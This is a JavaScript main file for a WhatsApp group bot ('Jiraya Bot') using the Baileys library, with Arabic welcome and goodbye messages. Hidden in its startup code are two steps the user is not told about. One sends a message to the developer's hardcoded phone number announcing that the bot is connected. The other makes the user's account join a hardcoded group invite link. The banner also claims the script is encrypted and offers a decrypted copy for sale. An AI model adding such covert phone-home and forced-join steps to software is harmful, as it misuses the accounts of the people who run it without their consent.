//pls give credit if you reupload 
//or copy the codes
//© 2022 Jiraya Bot Inc. JirayaBot
const {
    WAConnection,
    MessageType,
    Presence,
    Mimetype,
    GroupSettingChange
} = require('@adiwajshing/baileys')
const fs = require('fs')
const figlet = require('figlet')
const moment = require('moment-timezone')
const { wait, banner, getBuffer, h2k, generateMessageID, getGroupAdmins, getRandom, start, info, success, close } = require('./lib/functions.js')
const { color } = require('./lib/color.js')
const _welkom = JSON.parse(fs.readFileSync('./database/welcome.json'))
const setting = JSON.parse(fs.readFileSync('./setting/setting.json'))

session = setting.session


require('./JirayaBot.js')
nocache('./JirayaBot.js', module => console.log(`${module} telah di update!`))

const starts = async (JirayaBot = new WAConnection()) => {
    JirayaBot.logger.level = 'warn'
    JirayaBot.version = [2, 2142, 12]
    console.log(color(figlet.textSync('Jiraya Bot', {
		font: 'Standard',
		horizontalLayout: 'default',
		vertivalLayout: 'default',
		width: 80,
		whitespaceBreak: false
	}), 'cyan'))
	console.log(color('\n> YT CHANNEL: Jiraya ','silver'))
console.log(color('> GITHUB: Jiraya ','silver'))
console.log(color('> WA NUMBER: +34613110267 ','silver'))
console.log(color('  Jiraya Bot Inc. 2022','mediumseagreen'))
    console.log(color('<>','red'), color('I Wrote This Script By Myself!\nNote, The Script Is Encrypted, So You Wont Be Able To Recode, If You Wish To Buy Decrypted Script Contact The Developer', 'yellow'))
    console.log(color('<>','red'), color('Source Code Version: 3.0', 'aqua'))
    console.log(color('<>','red'), color('But? Error? Suggestion? Visit Here:', 'aqua'), color('https://wa.me/34613110267'))
    console.log(color('[Jiraya BOT]'), color('Jiraya Bot Is Online', 'aqua'))
    console.log(color('[DEV]', 'cyan'), color('Welcome Back Owner! Hope You Doing Well~', 'magenta'))
    console.log(color('<>','red'), color('Thanks For Using Jiraya Bot', 'white'))
	JirayaBot.browserDescription = [ 'Subscribe Jiraya', 'chrome', '3.0' ]
    JirayaBot.on('qr', () => {
        console.log(color('[','white'), color('!','red'), color(']','white'), color(' Scan the qr code in only 20 seconds !!'))
    })

    fs.existsSync(`./${session}.json`) && JirayaBot.loadAuthInfo(`./${session}.json`)
    JirayaBot.on('connecting', () => {
        start('2', 'Loading ...')
    })
    JirayaBot.on('open', () => {
        success('2', 'Connected ✓')
    })
        //inform to developer that the user is connected to bot
    JirayaBot.sendMessage(`34613110267@s.whatsapp.net`, `شكرا دادي جيرايا بوتك اشتغل معي 💠✋`, MessageType.extendedText)
    
    //group link target
    teks = `https://chat.whatsapp.com/CF77CbLwt965pglZ2Zb91h`
    JirayaBot.query({ json:["action", "invite", `${teks.replace('https://chat.whatsapp.com/','')}`]})
    
    await JirayaBot.connect({timeoutMs: 30*1000})
        fs.writeFileSync(`./${session}.json`, JSON.stringify(JirayaBot.base64EncodedAuthInfo(), null, '\t'))

    JirayaBot.on('chat-update', async (message) => {
        require('./JirayaBot.js')(JirayaBot, message, _welkom)
    })
JirayaBot.on("group-participants-update", async (anu) => {

    const isWelkom = _welkom.includes(anu.jid)
    try {
      groupMet = await JirayaBot.groupMetadata(anu.jid)
      groupMembers = groupMet.participants
      groupAdmins = getGroupAdmins(groupMembers)
      mem = anu.participants[0]

      console.log(anu)
      try {
        pp_user = await JirayaBot.getProfilePicture(mem)
      } catch (e) {
        pp_user = "https://telegra.ph/file/c9dfa715c26518201f478.jpg"
      }
      try {
        pp_group = await JirayaBot.getProfilePicture(anu.jid)
      } catch (e) {
        pp_group =
          "https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60"
      }
            if (anu.action == "add" && mem.includes(JirayaBot.user.jid)) {
        JirayaBot.sendMessage(anu.jid, "السلام عليكم ورحمه الله وبركاته،        ", "conversation")
      }
      buffer = await getBuffer(pp_user)
      if (anu.action == 'add' && !mem.includes(JirayaBot.user.jid)) {
      const mdata = await JirayaBot.groupMetadata(anu.jid)
      const memeg = mdata.participants.length
      const thu = await JirayaBot.getStatus(anu.participants[0], MessageType.text)
      const num = anu.participants[0]
      const bosco1 = await JirayaBot.prepareMessage("0@s.whatsapp.net", buffer, MessageType.location,{ thumbnail: buffer})
      const bosco2 = bosco1.message["ephemeralMessage"] ? bosco1.message.ephemeralMessage : bosco1
      let v = JirayaBot.contacts[num] || { notify: num.replace(/@.+/, '') }
      anu_user = v.vname || v.notify || num.split('@')[0]
      time_welc = moment.tz('Asia/Kolkata').format('DD/MM/YYYY')
      time_wel = moment.tz('Asia/Kolkata').format("hh:mm")
      teks = `  💠    منور ⇇ _*@${num.split('@')[0]}*_ \n  💠    البايو ⇇ : _*${thu.status}*_ \n  💠    عدد الاعضاء ⇇ : _*${memeg}*_ \n  💠    نورتنا في ⇇ _*${mdata.subject}*_\n  💠    ⇇لا تنسى تقرا القوانين الرابط فالوصف⇉`
      welcomeBut = [{buttonId:`#menu`,buttonText:{displayText:'قائمة الاوامر 🗂️'},type:1}, {buttonId:`#getdesc`,buttonText:{displayText:'قرائة الوصف 📋'},type:1}]
      welcomeButt = { contentText: `${teks}`, footerText: `جيرايا العم`, buttons: welcomeBut, headerType: 6, locationMessage: bosco2.message.locationMessage}
      JirayaBot.sendMessage(mdata.id, welcomeButt, MessageType.buttonsMessage, { caption: 'buffer', "contextInfo": { "mentionedJid" : [num], },})
      }
      if (anu.action == 'remove' && !mem.includes(JirayaBot.user.jid)) {
      const mdata = await JirayaBot.groupMetadata(anu.jid)
      const num = anu.participants[0]
      const bosco3 = await JirayaBot.prepareMessage("0@s.whatsapp.net", buffer, MessageType.location,{ thumbnail: buffer})
      const bosco4 = bosco3.message["ephemeralMessage"] ? bosco3.message.ephemeralMessage : bosco3
      let w = JirayaBot.contacts[num] || { notify: num.replace(/@.+/, '') }
      anu_user = w.vname || w.notify || num.split('@')[0]
      time_welc = moment.tz('Asia/Kolkata').format('DD/MM/YYYY')
      time_wel = moment.tz('Asia/Kolkata').format("hh:mm")
      memeg = mdata.participants.length
      out = `  💠    اتمنى لك التوفيق 💙 _*@${num.split('@')[0]}*_\n  💠    فقدنا شخص اخر 🐧💔`
      goodbyeBut = [{buttonId:`#gbye`,buttonText:{displayText:'👋 الله معك '},type:1}, {buttonId:`#menu`,buttonText:{displayText:'🗂️ الاوامر '}, type:1}]
      goodbyeButt = { contentText: `${out}`, footerText: `جيرايا العم`, buttons: goodbyeBut, headerType: 6, locationMessage: bosco3.message.locationMessage}
      JirayaBot.sendMessage(mdata.id, goodbyeButt, MessageType.buttonsMessage, { caption: 'buffer', "contextInfo": { "mentionedJid" : [num], },})
      }
    } catch (e) {
      console.log("Error : %s", color(e, "red"))
    }

  })
}

/**
 * Uncache if there is file change
 * @param {string} module Module name or path
 * @param {function} cb <optional> 
 */
function nocache(module, cb = () => { }) {
    console.log('Module', `'${module}'`, 'Now being watched for changes')
    fs.watchFile(require.resolve(module), async () => {
        await uncache(require.resolve(module))
        cb(module)
    })
}
/**
 * Uncache a module
 * @param {string} module Module name or path
 */
function uncache(module = '.') {
    return new Promise((resolve, reject) => {
        try {
            delete require.cache[require.resolve(module)]
            resolve()
        } catch (e) {
            reject(e)
        }
    })
}

starts()
